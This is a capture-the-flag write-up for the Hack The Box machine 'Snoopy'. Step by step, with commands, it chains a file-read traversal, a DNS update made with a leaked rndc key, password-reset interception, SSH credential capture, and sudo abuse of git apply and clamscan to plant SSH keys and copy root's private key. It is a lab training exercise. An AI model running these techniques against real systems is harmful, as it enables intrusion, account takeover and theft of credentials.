---
title: "HackTheBox - Snoopy"
date: 2023-09-23T11:09:31-05:00
tags: ["Arbitrary File Read","DNS","Postfix","Zone Transfer","nsupdate","MatterMost","SSH Honeypot","Cowrie","git","ClamAV","clamscan"]
description: "Snoopy is a hard difficulty box with a download function vulnerable to directory traversal, resulting in Arbitrary File Read. Additionally, the DNS server is configured to allow DNS updates from anybody carrying the rndc key. Using the Arbitrary File Read, we uncover the key and update Snoopy's mailserver to our own IP address. While receiving Snoopy's mail, we can request a password reset for a MatterMost account. Within the MatterMost channels is a custom command where we might submit new machines and addresses to be configured for the server. Using an SSH Honeypot, we can record the login attempts performed as someone tries to access our machine for the configuration. Using these credentials, we finally access the machine. We can abuse a git apply command to overwrite a user's authorized_keys with our own public key, and authenticate as that user. Lastly, we can abuse sudo privileges as root to perform a virus scan with a very generic virus signature list, and send our \"infected\" authorized_keys file straight to the /root/.ssh/ folder, allowing us to authenticate as root." 
image: "Snoopy.png"
categories: ["Hack The Box"]
---
## Enumeration
Initial nmap:
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-05-07 20:21 EDT
Nmap scan report for 10.10.11.212
Host is up (0.043s latency).
Not shown: 62463 closed tcp ports (conn-refused), 3069 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.45 seconds
```

There is port 53 open, so zone transfer might be possible

Examining the webpage appears to be a mostly functional website for SnoopySec:

![Home page](Images/Homepage.png)

Checking the link for their recent announcement, we can see a reference to a download function: `http://snoopy.htb/download?file=announcement.pdf`

Firstly to make the process seamless, I add snoopy.htb into my hosts file. This might also become important if we need to interact with the DNS server:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ tail /etc/hosts                 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.212 snoopy.htb
```


Viewing the announcement.pdf file, we can find an employee name in the signature without much useful information:

![The pdf is signed off by Sally, part of SnoopySec PR](Images/announcement.png)

### Enumerating subdomains via zone transfer

With the DNS server name, we can attempt a zone transfer with `dig` to determine all subdomains:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy/press_package]
└─$ dig AXFR @10.10.11.212 snoopy.htb  

; <<>> DiG 9.18.16-1-Debian <<>> AXFR @10.10.11.212 snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 44 msec
;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
;; WHEN: Sun May 07 20:48:53 EDT 2023
;; XFR size: 11 records (messages 1, bytes 325)
```

We see several subdomains, particularly `provisions.snoopy.htb`, `mm.snoopy.htb` and `mattermost.snoopy.htb`. We can add these to our /etc/hosts file as well.

```
10.10.11.212 snoopy.htb mattermost.snoopy.htb mm.snoopy.htb postgres.snoopy.htb provisions.snoopy.htb
```
Since ns1 and ns2 are related to name servers, they will not be useful as subdomains.

When we check out these addresses, we see `mm.snoopy.htb` points to a different page:

![MatterMost landing page](Images/mmlogin.png)

Trying weak credentials does not work, so it seems there is not much we can do here.

### File Read Vulnerability in download

Returning to the download function, we can explore directory traversal techniques for a file read vulnerability. There is still a resulting download occurring, but the size is 0:

![Attempting to download /etc/passwd](Images/passwd.png)

We can also confirm this is empty in the command line:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ file ~/Downloads/press_release.zip 
/home/kali/Downloads/press_release.zip: empty
```

Although we are not getting /etc/passwd, we are still doing a download operation; there is no server error. When trying for simple filter bypasses, we land on a combination that works:

![Download filter bypass](Images/passwd2.png)

The file is still delivered as press_release.zip
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ unzip press_release.zip 
Archive:  press_release.zip
  inflating: press_package/etc/passwd  
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ cat press_package/etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<...SNIP...>
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

Even though it is delivered as a zip, we are still sent the contents of /etc/passwd. From the passwd file we can see users on the box including `sbrown`, likely the account name for the PR contact Sally Brown.

### Snoopy's mailserver is being migrated
Further enumeration of source code files did not provide more insight, however when we explore the contact page of `snoopy.htb` we see an interesting notice:

![](Images/contact_notice.png)

The mailserver at `mail.snoopy.htb` is currently offline, which is confirmed by reviewing the zone transfer output. 
Returning back to the `mm.snoopy.htb` subdomain, we can deduce that registered accounts associated with machine usernames are linked to the offline mailserver. When attempting to reset password for an invalid user, the response is a vague confirmation:

![](Images/FakeReset.png)

However, when trying to reset using a valid account like `sbrown`, we see a unique error:

![](Images/RealReset.png)

If we could potentially set the mailserver to our own controlled machine, we might be able to receive these password reset emails. Using the file read vulnerability previously discovered, we can enumerate the DNS bind files:
### Enumerating DNS bind configurations
Checking /etc/bind/named.conf:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ cat press_package/etc/bind/named.conf      
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

Here we can view a rndc-key secret.
In /etc/bind/named.conf.local:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ cat press_package/etc/bind/named.conf.local 
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```
We can see DNS updates are allowed with the rndc-key. So now we should be able to send the DNS an update, telling that the mailserver is associated with our IP address. Then when we reset the password, we will be sent the reset link.
### Updating mail.snoopy.htb

making our key file:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ cat key                     
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```
Using nsupdate to update the mail server:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ nsupdate -k key
> server snoopy.htb
> update add mail.snoopy.htb 3600 IN A 10.10.14.114
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
mail.snoopy.htb.        3600    IN      A       10.10.14.114

> send
>
```
We can verify the update with nslookup:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ nslookup
> server snoopy.htb
Default server: snoopy.htb
Address: 10.10.11.212#53
> mail.snoopy.htb
Server:         snoopy.htb
Address:        10.10.11.212#53

** server can't find mail.snoopy.htb: NXDOMAIN
> mail.snoopy.htb
;; communications error to 10.10.11.212#53: timed out
Server:         snoopy.htb
Address:        10.10.11.212#53

Name:   mail.snoopy.htb
Address: 10.10.14.114
>

```
The first query to `mail.snoopy.htb` is done before updating, and we see the `NXDOMAIN` error. However, after sending the nsupdate and querying again, we are shown address 10.10.14.114.
### Using Postfix to receive the password reset email

After updating, we can send a reset email to ourselves successfully. However, just listening on the mail port is insufficient:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ nc -nvlp 25
listening on [any] 25 ...
connect to [10.10.14.114] from (UNKNOWN) [10.10.11.212] 46070
```

There is a connection, but no reset instructions are transmitted. To set up a proper mail receiver, I decided to set up postfix. During installation, I labeled the system mail name as `snoopy.htb`:

![](Images/postfix1.png)

After setup, postfix must be launched:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ systemctl start postfix

┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::25                   :::*                    LISTEN      -
```

We can see that we are indeed listening on port 25 now. We should be able to properly receive mail sent to our IP address.
After spending more time troubleshooting, I learn that because the mail is intended for `sbrown`, my mail server mail is rejecting it, as there is no `sbrown` user on my system. Adding a sbrown target is a very simple command:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ sudo useradd sbrown
```

And now finally, we successfully send a reset email for sbrown:
![](Images/RealReset2.png)

Looking at our /var/mail, we see a piece for sbrown:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ ls -al /var/mail
total 32
drwxrwsr-x  2 root   mail  4096 May 08 15:48 .
drwxr-xr-x 12 root   root  4096 Mar 23 00:24 ..
-rw-------  1 sbrown mail 21930 May 08 15:48 sbrown
```

Using sudo to read it's contents:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ sudo cat /var/mail/sbrown
From no-reply@snoopy.htb  Mon May 08 15:48:03 2023
Return-Path: <no-reply@snoopy.htb>
X-Original-To: sbrown@snoopy.htb
Delivered-To: sbrown@snoopy.htb
Received: from mm.snoopy.htb (snoopy.htb [10.10.11.212])
        by kali (Postfix) with UTF8SMTPS id 90EC23A0429
        for <sbrown@snoopy.htb>; Mon, 08 May 2023 15:48:03 -0400 (EDT)
<...SNIP...>

                                        <a href=3D"http://mm.snoopy.htb/res=
et_password_complete?token=3D5t8ecbojkyd68bgtenyw8uiwfdniycgmsuusxyxt419hbz=
ncc8bocmp9ezw9g4az" style=3D"display: inline-block; background: #FFFFFF; fo=
nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd=
ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: =
#1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF=
FF; padding: 15px 24px;" target=3D"_blank">
                                          Reset Password
<...SNIP...>
```
Here we have a link referencing a reset_password and associated token. Each line seems to end with an = and a return, so after trimming the extra contents we are left with this:
`http://mm.snoopy.htb/reset_password_complete?token=5t8ecbojkyd68bgtenyw8uiwfdniycgmsuusxyxt419hbzncc8bocmp9ezw9g4az`

Changing the password to `Password1`, we are shown the reset is successful:

![](Images/RealReset3.png)

Now we can authenticate as `sbrown`!

## Foothold
### Enumerating MatterMost chat histories
Inside the mattermost server, we can see a discussion mentioning a provisioning channel. On the channels tab, we can see the `Server Provisioning` channel and server_provision command as well.

![](Images/mm1.png)

Moving to the `Server Provisioning` channel, we can see the interesting custom /server_provision command previously discussed:

![](Images/mm2.png)

Executing the command, we are given a small form to request for a new server provision. We are able to submit an IP address of our choosing, and under the Operating System tab we can select Linux - TCP/2222. 

![](Images/mm3.png)

Before submitting, I set up a listener on port 2222.

```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ nc -nvlp 2222
listening on [any] 2222 ...
connect to [10.10.14.114] from (UNKNOWN) [10.10.11.212] 57928
SSH-2.0-paramiko_3.1.0
```

### Using Cowrie to establish an SSH honeypot
There is an ssh authentication request, but we are not seeing any details from our netcat listener. To better understand the connection attempt, I set up an ssh honeypot with [Cowrie](https://github.com/cowrie/cowrie).

First, using docker to install Cowrie:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ sudo docker pull cowrie/cowrie
Using default tag: latest
latest: Pulling from cowrie/cowrie
98478ba62ec6: Pulling fs layer
2b776ada0341: Pulling fs layer
<...SNIP...>
4f4fb700ef54: Pull complete
Digest: sha256:29a316fed1c9743594889adbaeeed5dd3640b00c724f9090844df8a95a70af9c
Status: Downloaded newer image for cowrie/cowrie:latest
docker.io/cowrie/cowrie:latest
```
Next, using docker to run on port 2222:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ sudo docker run -p 2222:2222 cowrie/cowrie:latest
/<...SNIP...>
2023-05-08T21:14:42+0000 [-] Generating new ed25519 keypair...
2023-05-08T21:14:42+0000 [-] Ready to accept SSH connections
```
Finally, resubmit the server provision form. My cowrie server receives a connection attempt, and relays to me what credentials were used:
```bash
2023-05-08T21:14:42+0000 [-] Ready to accept SSH connections
<...SNIP...>
2023-05-08T21:15:49+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
2023-05-08T21:15:49+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' trying auth b'password'
2023-05-08T21:15:49+0000 [HoneyPotSSHTransport,0,10.10.11.212] Could not read etc/userdb.txt, default database activated
2023-05-08T21:15:49+0000 [HoneyPotSSHTransport,0,10.10.11.212] login attempt [b'cbrown'/b'sn00pedcr3dential!!!'] failed
2023-05-08T21:15:50+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' failed auth b'password'
2023-05-08T21:15:50+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
```

We now have credentials as `cbrown:sn00pedcr3dential!!!` and can use this to access the system!

## Lateral Movement
### Leveraging git apply to patch files outside of git repository
Checking sudo privs:
```bash
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git apply *
```

With `git apply`, we can use a patch file containing git differences, and apply the changes specified. With the `--unsafe-paths` flag, we are able to make changes to files outside the regular git directory. We can use this for lateral movement by creating a git diff file in which we add our ssh public key to authorized_keys, and point the edit path to be in /home/sbrown/.ssh/ folder. This will allow us to authenticate as `sbrown` using our own ssh key. Generating the ssh key in kali:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ ssh-keygen -t rsa -b 4096
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_rsa
```
Now, getting our id_rsa.pub, we will add this to the target's authorized_keys file:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ cat ~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ== kali@kali
```

First making a git repository with an initial commit:
```bash
cbrown@snoopy:/dev/shm$ mkdir gittest
cbrown@snoopy:/dev/shm$ cd gittest/
cbrown@snoopy:/dev/shm/gittest$ git init
Initialized empty Git repository in /dev/shm/gittest/.git/
cbrown@snoopy:/dev/shm/gittest$ touch test
cbrown@snoopy:/dev/shm/gittest$ git add .
cbrown@snoopy:/dev/shm/gittest$ git commit -m 'init'
[main (root-commit) 6e665e0] init
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 test
 ```
After 1 commit, we have a reference. We add the authorized_keys file and make a 2nd commit.
```bash
cbrown@snoopy:/dev/shm/gittest$ vim authorized_keys
cbrown@snoopy:/dev/shm/gittest$ git add .
cbrown@snoopy:/dev/shm/gittest$ git commit -m 'test'
[main 6d81c28] test
 1 file changed, 1 insertion(+)
 create mode 100644 authorized_keys
cbrown@snoopy:/dev/shm/gittest$ git log
commit 6d81c284773a4d699ac388166473090e3375beb8 (HEAD -> main)
Author: cbrown <cbrown@snoopy.htb>
Date:   Tue May 9 15:33:35 2023 +0000

    test

commit 6e665e02a51919d212d5d9fdf6ac01a513cc23e6
Author: cbrown <cbrown@snoopy.htb>
Date:   Tue May 09 15:31:22 2023 +0000

    init
```
Now we can use `git diff` to create a diff file:
```bash
cbrown@snoopy:/dev/shm/gittest$ git diff 6e665e02a51919d212d5d9fdf6ac01a513cc23e6
diff --git a/authorized_keys b/authorized_keys
new file mode 100644
index 0000000..90fad14
--- /dev/null
+++ b/authorized_keys
@@ -0,0 +1 @@
+sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ== kali@kali
```

Executing the git apply:

```bash
cbrown@snoopy:/dev/shm/gittest$ sudo -u sbrown git apply --unsafe-paths --directory "/home/sbrown/.ssh" patch 
Checking patch /home/sbrown/.ssh/authorized_keys...
Applied patch /home/sbrown/.ssh/authorized_keys cleanly.
```

Now we can authenticate:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ ssh sbrown@10.10.11.212
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
<...SNIP...>
sbrown@snoopy:~$
```
## Privilege Escalation
### Abusing ClamAV scanning to rewrite authorized_keys
Checking for sudo privileges:
```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan
```

We are able to run `clamscan`, an antivirus scanner, as root. One of the features of this scanner is we can supply our own virus signature databases, and we are also able to specify how we might treat "infected" files. My idea was to create an extremely generic virus database, one that will flag whichever file I want even when I can't read it. Next, I scan my own authorized_keys file, and set the scan to move infected files to /root/.ssh/. When this happens, I will be able to authenticate once again with my own key.

Using [this resource](https://forum.proxmox.com/threads/clamav-create-custom-signature-database-file.113754/) to generate a vague database. First, use `xxd` to generate the first segment of hex:

```bash
sbrown@snoopy:/tmp$ xxd /home/sbrown/.ssh/authorized_keys 
00000000: 7373 682d 7273 6120 4141 4141 4233 4e7a  ssh-rsa AAAAB3Nz
00000010: 6143 3179 6332 4541 4141 4144 4151 4142  aC1yc2EAAAADAQAB
<...SNIP...>
```
The virus database is considered malformed if I use a signature fewer than 8 characters. So, using the first 8, I create a database with 1 entry:
```bash
sbrown@snoopy:/tmp$ cat 1.ndb 
Trojan.A:0:*:7373682d
```
Now when we scan any authorized_keys file, it is flagged as a virus:
```bash
sbrown@snoopy:/tmp$ clamscan -d 1.ndb /home/sbrown/.ssh/authorized_keys 
Loading:     0s, ETA:   0s [========================>]        1/1 sigs    
Compiling:   0s, ETA:   0s [========================>]       40/40 tasks 

/home/sbrown/.ssh/authorized_keys: Trojan.A.UNOFFICIAL FOUND

----------- SCAN SUMMARY -----------
Known viruses: 1
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.010 sec (0 m 0 s)
Start Date: 2023:05:09 22:29:21
End Date:   2023:05:09 22:29:21
```

If we send a copy to /root/.ssh/authorized_keys now, it will be renamed to authorized_keys1 since there already exists keys. We can scan /root/.ssh/authorized_keys now, and move it somewhere else:
```bash
sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb /root/.ssh/authorized_keys --move=./
Loading:     0s, ETA:   0s [========================>]        1/1 sigs
Compiling:   0s, ETA:   0s [========================>]       40/40 tasks

/root/.ssh/authorized_keys: Trojan.A.UNOFFICIAL FOUND
traverse_rename: Failed to rename: /root/.ssh/authorized_keys
        to: /tmp/authorized_keys
Error:Invalid cross-device link
/root/.ssh/authorized_keys: moved to '/tmp/authorized_keys'

----------- SCAN SUMMARY -----------
Known viruses: 1
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.010 sec (0 m 0 s)
Start Date: 2023:05:09 22:32:34
End Date:   2023:05:09 22:32:34
```
Now I edited this authorized_keys to recognize my kali private key:
```bash
sbrown@snoopy:/tmp$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ== kali@kali
```
Lastly, I sent it back:
```bash
sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb ./authorized_keys --move=/root/.ssh/
Loading:     0s, ETA:   0s [========================>]        1/1 sigs
Compiling:   0s, ETA:   0s [========================>]       40/40 tasks

/tmp/authorized_keys: Trojan.A.UNOFFICIAL FOUND
traverse_rename: Failed to rename: /tmp/authorized_keys
        to: /root/.ssh/authorized_keys
Error:Invalid cross-device link
/tmp/authorized_keys: moved to '/root/.ssh/authorized_keys'

----------- SCAN SUMMARY -----------
Known viruses: 1
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.012 sec (0 m 0 s)
Start Date: 2023:05:09 22:35:07
End Date:   2023:05:09 22:35:07
sbrown@snoopy:/tmp$
```
Now I can authenticate as root:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ ssh root@10.10.11.212
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
<...SNIP...>
root@snoopy:~# whoami
root
root@snoopy:~# 
```

### Bonus: Using the custom virus database to copy the private key
The same method can be done to swipe the private ssh key. First, `xxd` an example private key to get the hex values:
```bash
┌──(kali㉿kali)-[~/Documents/Snoopy]
└─$ xxd ~/.ssh/id_rsa
00000000: 2d2d 2d2d 2d42 4547 494e 204f 5045 4e53  -----BEGIN OPENS
00000010: 5348 2050 5249 5641 5445 204b 4559 2d2d  SH PRIVATE KEY--
```
Create a virus database that will flag all private keys:
```bash
sbrown@snoopy:/tmp$ cat 1.ndb
Trojan.A:0:*:2d2d2d2d
```
Next, copy the private id_rsa to your current location:
```bash
sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb /root/.ssh/id_rsa --copy=./
Loading:     0s, ETA:   0s [========================>]        1/1 sigs
Compiling:   0s, ETA:   0s [========================>]       40/40 tasks

/root/.ssh/id_rsa: Trojan.A.UNOFFICIAL FOUND
/root/.ssh/id_rsa: copied to '/tmp/id_rsa'

----------- SCAN SUMMARY -----------
Known viruses: 1
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.014 sec (0 m 0 s)
Start Date: 2023:05:09 22:43:31
End Date:   2023:05:09 22:43:31
sbrown@snoopy:/tmp$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
<...SNIP...>
```
## Reflection
I enjoyed the learning process for this box a considerable amount. Even from the beginning of enumerating DNS config files and setting up a mail server, this challenge gave me the opportunity to learn many new things! Although it was revealed to be mostly unintended, I appreciated how there were several possible paths to root. It was fun to discuss with others the ideas they had to manipulate the `clamscan` behaviors.
